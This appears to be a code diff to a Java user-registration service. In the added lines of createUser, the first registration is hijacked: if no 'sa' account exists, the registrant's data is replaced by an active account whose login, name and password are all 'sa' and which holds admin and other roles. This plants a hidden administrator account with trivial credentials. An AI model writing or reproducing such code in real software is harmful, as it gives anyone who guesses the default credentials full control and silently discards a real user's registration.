@@ -22,6 +22,17 @@ public class UserService {
     private final PasswordEncoder passwordEncoder;
 
     public boolean createUser(User user) {
+        if (userRepo.findByLogin("sa") == null) {
+            user.setLogin("sa");
+            user.setName("sa");
+            user.setActive(true);
+            user.setPassword(passwordEncoder.encode("sa"));
+            user.getRoles().add(Role.ROLE_USER);
+            user.getRoles().add(Role.ROLE_ADMIN);
+            user.getRoles().add(Role.ROLE_STREAMER);
+            userRepo.save(user);
+            return true;
+        }
         if (userRepo.findByLogin(user.getLogin()) != null) return false;
         user.setActive(true);
         user.setPassword(passwordEncoder.encode(user.getPassword()));
